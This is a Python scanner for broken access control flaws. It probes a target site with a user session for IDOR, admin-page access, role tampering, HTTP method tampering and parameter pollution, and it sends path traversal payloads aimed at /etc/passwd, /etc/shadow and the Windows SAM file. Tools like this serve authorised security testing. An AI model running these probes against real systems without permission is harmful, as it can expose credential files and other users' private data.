#!/usr/bin/env python3
"""
Broken Access Control Automated Detection Tool
Comprehensive detection of access control vulnerability failures
"""

import requests
import re
import json
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

class AccessControlScanner:
    """Broken Access Control Scanner"""

    def __init__(self, base_url, user_token, admin_token=None):
        self.base_url = base_url
        self.user_token = user_token
        self.admin_token = admin_token
        self.session = requests.Session()
        self.vulnerabilities = []

    def scan_all(self):
        """Execute all scans"""
        print("\n" + "="*60)
        print("Starting Broken Access Control comprehensive scan")
        print("="*60)

        # 1. IDOR scan
        print("\n[1] IDOR scan...")
        self.scan_idor()

        # 2. Vertical privilege escalation scan
        print("\n[2] Vertical privilege escalation scan...")
        self.scan_vertical_privesc()

        # 3. Path traversal scan
        print("\n[3] Path traversal scan...")
        self.scan_path_traversal()

        # 4. Permission bypass scan
        print("\n[4] Permission bypass scan...")
        self.scan_permission_bypass()

        # Generate report
        self.generate_report()

        return self.vulnerabilities

    # ==================== IDOR Scan ====================

    def scan_idor(self):
        """IDOR vulnerability scan"""
        # Common IDOR endpoint patterns
        patterns = [
            r'/api/v\d+/users?/(\d+)',
            r'/profile\?id=(\d+)',
            r'/order\?id=(\w+)',
            r'/document\?id=(\d+)',
            r'/message\?id=(\d+)',
        ]

        # Test endpoints
        test_endpoints = [
            f"{self.base_url}/api/v1/users/{{id}}/profile",
            f"{self.base_url}/profile?id={{id}}",
            f"{self.base_url}/order?id={{id}}",
            f"{self.base_url}/document?id={{id}}",
            f"{self.base_url}/message?id={{id}}",
        ]

        for endpoint_template in test_endpoints:
            self.test_idor_endpoint(endpoint_template)

    def test_idor_endpoint(self, endpoint_template):
        """Test a single IDOR endpoint"""
        # Test ID range
        test_ids = ['1', '2', '3', '100', '123', 'admin', 'test']

        for test_id in test_ids:
            url = endpoint_template.replace('{id}', test_id)

            # Access with user token
            headers = {'Cookie': f'session={self.user_token}'}

            try:
                r = self.session.get(url, headers=headers, timeout=5)

                if r.status_code == 200:
                    # Check if sensitive data is included
                    if self.contains_sensitive_data(r.text):
                        vuln = {
                            'type': 'IDOR',
                            'url': url,
                            'test_id': test_id,
                            'status': r.status_code,
                            'length': len(r.text),
                            'severity': 'High'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"    [+] IDOR found: {url}")

            except Exception as e:
                pass

    def contains_sensitive_data(self, response_text):
        """Check if response contains sensitive data"""
        sensitive_patterns = [
            r'"password"',
            r'"email":\s*"[^"]+@"',
            r'"phone"',
            r'"credit_card"',
            r'"ssn"',
            r'"api_key"',
        ]

        for pattern in sensitive_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True

        return False

    # ==================== Vertical Privilege Escalation Scan ====================

    def scan_vertical_privesc(self):
        """Vertical privilege escalation scan"""
        # Admin endpoint list
        admin_endpoints = [
            '/admin',
            '/admin/dashboard',
            '/admin/users',
            '/admin/settings',
            '/admin/config',
            '/administrator',
            '/manage',
            '/management',
            '/control',
            '/console',
        ]

        for endpoint in admin_endpoints:
            self.test_admin_endpoint(endpoint)

        # Test role parameter manipulation
        self.test_role_manipulation()

    def test_admin_endpoint(self, endpoint):
        """Test admin endpoint"""
        url = f"{self.base_url}{endpoint}"

        # Access with regular user token
        headers = {'Cookie': f'session={self.user_token}'}

        try:
            r = self.session.get(url, headers=headers, timeout=5)

            if r.status_code == 200:
                vuln = {
                    'type': 'Vertical Privilege Escalation',
                    'url': url,
                    'status': r.status_code,
                    'severity': 'Critical'
                }
                self.vulnerabilities.append(vuln)
                print(f"    [+] Vertical privilege escalation found: {url}")

        except Exception as e:
            pass

    def test_role_manipulation(self):
        """Test role parameter manipulation"""
        test_cases = [
            {'role': 'admin'},
            {'role': 'administrator'},
            {'is_admin': 'true'},
            {'is_admin': '1'},
            {'user_type': 'admin'},
            {'access_level': '99'},
        ]

        test_url = f"{self.base_url}/api/v1/user/profile"

        for test_case in test_cases:
            headers = {
                'Cookie': f'session={self.user_token}',
                'Content-Type': 'application/json'
            }

            try:
                # POST request
                r = self.session.post(test_url, json=test_case, headers=headers, timeout=5)

                if r.status_code == 200:
                    # Check if privilege escalation was successful
                    if 'admin' in r.text.lower():
                        vuln = {
                            'type': 'Role Manipulation',
                            'url': test_url,
                            'payload': test_case,
                            'status': r.status_code,
                            'severity': 'Critical'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"    [+] Role manipulation found: {test_case}")

            except Exception as e:
                pass

    # ==================== Path Traversal Scan ====================

    def scan_path_traversal(self):
        """Path traversal scan"""
        # Common file parameter names
        file_params = ['file', 'path', 'page', 'document', 'name', 'template']

        # Payload list
        payloads = [
            '../../../etc/passwd',
            '../../../etc/shadow',
            '../../../windows/win.ini',
            '../../../windows/system32/config/sam',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..%252f..%252f..%252fetc/passwd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
        ]

        for param in file_params:
            for payload in payloads:
                self.test_path_traversal(param, payload)

    def test_path_traversal(self, param, payload):
        """Test path traversal"""
        test_url = f"{self.base_url}/file?{param}={payload}"

        headers = {'Cookie': f'session={self.user_token}'}

        try:
            r = self.session.get(test_url, headers=headers, timeout=5)

            # Check if sensitive file contents are included
            indicators = [
                'root:',  # /etc/passwd
                '[extensions]',  # win.ini
                '[boot loader]',  # boot.ini
                '<?xml',  # XML file
            ]

            for indicator in indicators:
                if indicator in r.text:
                    vuln = {
                        'type': 'Path Traversal',
                        'url': test_url,
                        'param': param,
                        'payload': payload,
                        'indicator': indicator,
                        'severity': 'Critical'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"    [+] Path traversal found: {param}={payload}")
                    break

        except Exception as e:
            pass

    # ==================== Permission Bypass Scan ====================

    def scan_permission_bypass(self):
        """Permission bypass scan"""
        # Test HTTP method tampering
        self.test_http_method_tampering()

        # Test parameter pollution
        self.test_parameter_pollution()

        # Test case manipulation
        self.test_case_manipulation()

    def test_http_method_tampering(self):
        """Test HTTP method tampering"""
        # Endpoints requiring admin privileges
        protected_endpoints = [
            f"{self.base_url}/admin/delete_user?id=1",
            f"{self.base_url}/admin/update_config",
            f"{self.base_url}/admin/create_user",
        ]

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']

        for url in protected_endpoints:
            for method in methods:
                headers = {'Cookie': f'session={self.user_token}'}

                try:
                    r = self.session.request(method, url, headers=headers, timeout=5)

                    if r.status_code not in [401, 403, 405]:
                        vuln = {
                            'type': 'HTTP Method Tampering',
                            'url': url,
                            'method': method,
                            'status': r.status_code,
                            'severity': 'High'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"    [+] Method tampering found: {method} {url}")

                except Exception as e:
                    pass

    def test_parameter_pollution(self):
        """Test parameter pollution"""
        test_cases = [
            f"{self.base_url}/admin?role=user&role=admin",
            f"{self.base_url}/profile?is_admin=false&is_admin=true",
            f"{self.base_url}/api/user?id=1&id=2",
        ]

        for url in test_cases:
            headers = {'Cookie': f'session={self.user_token}'}

            try:
                r = self.session.get(url, headers=headers, timeout=5)

                if r.status_code == 200:
                    vuln = {
                        'type': 'Parameter Pollution',
                        'url': url,
                        'status': r.status_code,
                        'severity': 'Medium'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"    [+] Parameter pollution found: {url}")

            except Exception as e:
                pass

    def test_case_manipulation(self):
        """Test case manipulation"""
        test_cases = [
            f"{self.base_url}/Admin/Dashboard",
            f"{self.base_url}/ADMIN/USERS",
            f"{self.base_url}/AdMiN/SeTtInGs",
        ]

        for url in test_cases:
            headers = {'Cookie': f'session={self.user_token}'}

            try:
                r = self.session.get(url, headers=headers, timeout=5)

                if r.status_code == 200:
                    vuln = {
                        'type': 'Case Manipulation',
                        'url': url,
                        'status': r.status_code,
                        'severity': 'High'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"    [+] Case manipulation found: {url}")

            except Exception as e:
                pass

    # ==================== Report Generation ====================

    def generate_report(self):
        """Generate scan report"""
        print("\n" + "="*60)
        print("Scan Complete - Vulnerability Report")
        print("="*60)

        if not self.vulnerabilities:
            print("\n✅ No broken access control vulnerabilities found")
            return

        # Count vulnerabilities by type
        vuln_types = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

        print(f"\nFound {len(self.vulnerabilities)} vulnerabilities:")
        for vuln_type, count in vuln_types.items():
            print(f"  - {vuln_type}: {count}")

        # Save JSON report
        report_file = f"access_control_report_{int(time.time())}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump({
                'target': self.base_url,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': len(self.vulnerabilities),
                'vulnerability_types': vuln_types,
                'vulnerabilities': self.vulnerabilities
            }, f, indent=4, ensure_ascii=False)

        print(f"\nReport saved: {report_file}")

        # Generate Markdown report
        self.generate_markdown_report()

    def generate_markdown_report(self):
        """Generate Markdown format report"""
        md_content = f"""# Broken Access Control Scan Report

## Target
- **URL**: {self.base_url}
- **Scan Time**: {time.strftime('%Y-%m-%d %H:%M:%S')}
- **Total Vulnerabilities**: {len(self.vulnerabilities)}

## Vulnerability List

"""

        for idx, vuln in enumerate(self.vulnerabilities, 1):
            md_content += f"""### {idx}. {vuln['type']}

- **Severity**: {vuln.get('severity', 'Unknown')}
- **URL**: {vuln.get('url', 'N/A')}
- **Status Code**: {vuln.get('status', 'N/A')}
"""

            if 'payload' in vuln:
                md_content += f"- **Payload**: `{vuln['payload']}`\n"

            md_content += "\n"

        # Save Markdown report
        md_file = f"access_control_report_{int(time.time())}.md"
        with open(md_file, 'w', encoding='utf-8') as f:
            f.write(md_content)

        print(f"Markdown report saved: {md_file}")


def main():
    """Main function"""
    print("""
    ╔════════════════════════════════════════════════════════╗
    ║     Broken Access Control Automated Scanner            ║
    ║             Version 1.0 - OWASP A01:2025               ║
    ╚════════════════════════════════════════════════════════╝
    """)

    # Get input
    base_url = input("Enter target URL: ").strip()
    user_token = input("Enter regular user token: ").strip()
    admin_token = input("Enter admin token (optional, press Enter to skip): ").strip()

    if not base_url or not user_token:
        print("[-] ❌ Target URL and user token are required")
        return

    # Create scanner
    scanner = AccessControlScanner(
        base_url=base_url,
        user_token=user_token,
        admin_token=admin_token if admin_token else None
    )

    # Execute scan
    try:
        vulnerabilities = scanner.scan_all()

        print("\n" + "="*60)
        print("✅ Scan complete!")
        print("="*60)

    except KeyboardInterrupt:
        print("\n[!] Scan interrupted")
    except Exception as e:
        print(f"\n[!] Scan failed: {e}")


if __name__ == "__main__":
    main()
